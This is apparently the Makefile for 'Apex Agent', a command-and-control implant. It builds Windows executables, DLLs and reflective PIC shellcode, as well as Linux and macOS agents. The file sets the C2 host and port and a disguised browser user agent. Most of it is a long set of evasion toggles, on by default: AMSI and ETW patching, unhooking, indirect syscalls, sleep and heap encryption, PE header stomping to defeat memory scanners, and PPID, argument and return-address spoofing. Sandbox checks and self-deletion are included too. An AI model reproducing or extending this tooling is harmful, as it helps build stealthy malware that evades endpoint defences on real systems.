# Apex Agent - Multi-platform payload build
# Windows: x86_64-w64-mingw32-gcc (mingw-w64)
# Linux:   gcc (native on teamserver)
# macOS:   o64-clang (osxcross) or clang (native on macOS)

# ── Compilers ──
WIN_CC   = x86_64-w64-mingw32-gcc
LINUX_CC = gcc
MACOS_CC = $(shell command -v o64-clang 2>/dev/null || echo clang)

# ── Build-time config (override via env) ──
C2_HOST  ?= 127.0.0.1
C2_PORT  ?= 8080
USE_HTTPS ?= 0
USE_MTLS  ?= 0
C2_USER_AGENT ?= Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
C2_URI        ?= /api/submit

# ── Common defines ──
COMMON_DEFS = -DC2_HOST=\"$(C2_HOST)\" -DC2_PORT=$(C2_PORT) -DUSE_HTTPS=$(USE_HTTPS) -DUSE_MTLS=$(USE_MTLS)
COMMON_DEFS += '-DC2_USER_AGENT="$(C2_USER_AGENT)"' '-DC2_URI="$(C2_URI)"'

# ── Windows evasion toggles ──
ENABLE_ETW_PATCH     ?= 1
ENABLE_AMSI_PATCH    ?= 1
ENABLE_SLEEP_ENCRYPT ?= 1
ENABLE_UNHOOK        ?= 1
ENABLE_INDIRECT_SYSCALL ?= 1
SYSCALL_METHOD          ?= 0   # 0=auto, 1=hellsgate(disk), 2=halosgate(mem)
ENABLE_NT_PROCESS    ?= 1   # Use NtCreateUserProcess instead of CreateProcessA (#7)
ENABLE_HEAP_ENCRYPT  ?= 1   # XOR-encrypt heap regions during sleep (#4)
SLEEP_METHOD         ?= 1   # 0=plain-XOR+Sleep, 1=Ekko-ROP, 2=Foliage-APC
ENABLE_PE_STOMP      ?= 1   # Overwrite MZ/PE header in-memory (defeats pe-sieve)
PE_STOMP_MODE        ?= 2   # 1=DOS-only, 2=full-NT-headers, 3=sledgehammer
PE_STOMP_RANDOMISE   ?= 0   # 0=zero-fill, 1=pseudo-random fill
ENABLE_UDRL          ?= 1   # User-Defined Reflective Loader (no PEB registration)
ENABLE_DRIP_LOAD     ?= 1   # Gradual memory allocation evasion
ENABLE_RET_ADDR_SPOOF ?= 1  # Thread return address spoofing
ENABLE_SYNTHETIC_FRAMES ?= 1 # Synthetic stack frames during sleep
ENABLE_BLOCK_DLLS    ?= 1   # Block non-MS DLLs in child processes
ENABLE_ARG_SPOOF     ?= 1   # Process argument spoofing
ENABLE_PPID_SPOOF    ?= 1   # PPID spoofing to explorer.exe (#6)

# ── POSIX (Linux/macOS) evasion toggles ──
ENABLE_ANTI_DEBUG    ?= 1
ENABLE_PROC_MASK     ?= 1
ENABLE_SELF_DELETE   ?= 0
ENABLE_ENV_CLEAN     ?= 1
ENABLE_SANDBOX_CHECK ?= 1

# ── Windows flags ──
WIN_CFLAGS  = -Wall -Wextra -O2 -s -D_WIN32_WINNT=0x0600 -static-libgcc $(COMMON_DEFS)
WIN_CFLAGS += -DENABLE_ETW_PATCH=$(ENABLE_ETW_PATCH)
WIN_CFLAGS += -DENABLE_AMSI_PATCH=$(ENABLE_AMSI_PATCH)
WIN_CFLAGS += -DENABLE_SLEEP_ENCRYPT=$(ENABLE_SLEEP_ENCRYPT)
WIN_CFLAGS += -DENABLE_UNHOOK=$(ENABLE_UNHOOK)
WIN_CFLAGS += -DENABLE_INDIRECT_SYSCALL=$(ENABLE_INDIRECT_SYSCALL)
WIN_CFLAGS += -DSYSCALL_METHOD=$(SYSCALL_METHOD)
WIN_CFLAGS += -DENABLE_NT_PROCESS=$(ENABLE_NT_PROCESS)
WIN_CFLAGS += -DENABLE_HEAP_ENCRYPT=$(ENABLE_HEAP_ENCRYPT)
WIN_CFLAGS += -DSLEEP_METHOD=$(SLEEP_METHOD)
WIN_CFLAGS += -DENABLE_PE_STOMP=$(ENABLE_PE_STOMP)
WIN_CFLAGS += -DPE_STOMP_MODE=$(PE_STOMP_MODE)
WIN_CFLAGS += -DPE_STOMP_RANDOMISE=$(PE_STOMP_RANDOMISE)
WIN_CFLAGS += -DENABLE_UDRL=$(ENABLE_UDRL)
WIN_CFLAGS += -DENABLE_DRIP_LOAD=$(ENABLE_DRIP_LOAD)
WIN_CFLAGS += -DENABLE_RET_ADDR_SPOOF=$(ENABLE_RET_ADDR_SPOOF)
WIN_CFLAGS += -DENABLE_SYNTHETIC_FRAMES=$(ENABLE_SYNTHETIC_FRAMES)
WIN_CFLAGS += -DENABLE_BLOCK_DLLS=$(ENABLE_BLOCK_DLLS)
WIN_CFLAGS += -DENABLE_ARG_SPOOF=$(ENABLE_ARG_SPOOF)
WIN_CFLAGS += -DENABLE_PPID_SPOOF=$(ENABLE_PPID_SPOOF)
WIN_LDFLAGS = -mwindows -lwinhttp -lws2_32 -lbcrypt -lgdi32 -ladvapi32 -lcrypt32 -static-libgcc

# ── Linux flags ──
LINUX_CFLAGS  = -Wall -Wextra -O2 -s $(COMMON_DEFS)
LINUX_CFLAGS += -DENABLE_ANTI_DEBUG=$(ENABLE_ANTI_DEBUG)
LINUX_CFLAGS += -DENABLE_PROC_MASK=$(ENABLE_PROC_MASK)
LINUX_CFLAGS += -DENABLE_SELF_DELETE=$(ENABLE_SELF_DELETE)
LINUX_CFLAGS += -DENABLE_ENV_CLEAN=$(ENABLE_ENV_CLEAN)
LINUX_CFLAGS += -DENABLE_SANDBOX_CHECK=$(ENABLE_SANDBOX_CHECK)
LINUX_LDFLAGS = -lpthread
ifeq ($(USE_HTTPS),1)
LINUX_LDFLAGS += -lssl -lcrypto
endif

# ── macOS flags ──
MACOS_CFLAGS  = -Wall -Wextra -O2 $(COMMON_DEFS)
MACOS_CFLAGS += -DENABLE_ANTI_DEBUG=$(ENABLE_ANTI_DEBUG)
MACOS_CFLAGS += -DENABLE_PROC_MASK=$(ENABLE_PROC_MASK)
MACOS_CFLAGS += -DENABLE_SELF_DELETE=$(ENABLE_SELF_DELETE)
MACOS_CFLAGS += -DENABLE_ENV_CLEAN=$(ENABLE_ENV_CLEAN)
MACOS_CFLAGS += -DENABLE_SANDBOX_CHECK=$(ENABLE_SANDBOX_CHECK)
MACOS_LDFLAGS = -lpthread
ifeq ($(USE_HTTPS),1)
MACOS_LDFLAGS += -lssl -lcrypto
endif

.PHONY: exe dll shellcode service_exe linux-elf macos-macho all clean

# ── Host tool for PIC shellcode generation ──
gen_shellcode: gen_shellcode.c
	$(CC) -O2 -o gen_shellcode gen_shellcode.c

# ── Windows targets ──
exe:
	$(WIN_CC) $(WIN_CFLAGS) -o agent.exe main.c $(WIN_LDFLAGS)

dll:
	$(WIN_CC) $(WIN_CFLAGS) -shared -DBUILD_DLL -o agent.dll main.c $(WIN_LDFLAGS)

# DLL for shellcode: skip CRT startup (avoids TLS init + security cookie crash
# in reflective context). Entry is DllMain directly, not _DllMainCRTStartup.
# CRT functions (malloc, snprintf, etc.) still work — they're msvcrt.dll imports.
dll-pic:
	$(WIN_CC) $(WIN_CFLAGS) -shared -DBUILD_DLL -fno-stack-protector \
		-Wl,--entry,DllMain,--disable-nxcompat \
		-o agent_pic.dll main.c $(WIN_LDFLAGS)

# True PIC shellcode: reflective loader stub + DLL
shellcode: gen_shellcode dll-pic
	$(WIN_CC) -Os -nostdlib -nostartfiles -fno-stack-protector \
		-fno-exceptions -fno-asynchronous-unwind-tables -fno-ident \
		-Wl,--no-seh,--entry,_start -o pic_stub.exe pic_loader.c
	x86_64-w64-mingw32-objcopy -O binary pic_stub.exe pic_stub.bin
	./gen_shellcode pic_stub.bin agent_pic.dll agent.bin
	@echo "[+] PIC shellcode generated: agent.bin"

service_exe: exe

# ── Linux target ──
linux-elf:
	$(LINUX_CC) $(LINUX_CFLAGS) -o agent_linux agent_posix.c $(LINUX_LDFLAGS)

# ── macOS target ──
macos-macho:
	$(MACOS_CC) $(MACOS_CFLAGS) -o agent_macos agent_posix.c $(MACOS_LDFLAGS)

all: exe linux-elf

clean:
	rm -f agent.exe agent.dll agent_pic.dll agent.bin agent_linux agent_macos agent_shellcode.o \
	      gen_shellcode pic_stub.exe pic_stub.bin include/mtls_cert.h
